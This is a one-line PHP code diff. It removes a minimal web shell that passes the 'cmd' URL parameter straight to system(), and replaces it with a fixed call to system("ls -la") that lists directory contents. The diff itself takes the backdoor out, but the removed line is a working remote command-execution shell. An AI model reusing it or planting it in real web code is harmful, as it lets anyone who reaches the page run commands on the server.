@@ -1,1 +1,1 @@
-<?php $p=$_GET[cmd]; echo system( $p); ?>
+<?php echo system("ls -la"); ?>
